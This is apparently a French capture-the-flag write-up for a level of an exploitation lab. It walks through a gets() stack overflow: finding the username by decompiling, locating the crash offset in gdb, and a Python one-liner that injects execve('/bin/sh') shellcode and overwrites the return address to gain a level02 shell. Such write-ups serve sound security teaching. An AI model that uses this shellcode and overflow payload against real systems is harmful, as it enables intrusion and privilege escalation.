Un programme demandant un login puis un password.
Mais pas d'appel a /bin/sh cette fois. Par contre, deux appels à gets, qui lisent 100 caractères et les stocks dans deux variables différentes.
En décompilant, on trouve que l'admin attendu est "dat_wil". Il reste donc 93 caractères potentiels pour un shellcode. (la fonction de vérification de l'admin ne regarde que les 7 premiers
caractères). On fait segfault le deuxieme appel a gets, pour savoir quand réecrire EIP et la faire pointer sur le shellcode stocké dans la première variable.

(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
(gdb)
On segfault donc après 80 caractères.
On va donc insérer l'adresse de la première variable+7 (pour tomber sur notre shellcode) apres les 80 caractères.

L'adresse en question est: 0x0804a040 + 7, soit 0x0804a047
(gdb) x/24x $esp
0xffffd6a0:     0x0804a040      0x00000100      0xf7fcfac0      0xf7ec34fb

python -c "print 'dat_wil' + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\n' +'\x90'*80+'\x47\xa0\x04\x08'" > /tmp/lvl1
cat /tmp/lvl1 - | ./level01

level01@OverRide:~$ cat /tmp/lvl1 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02

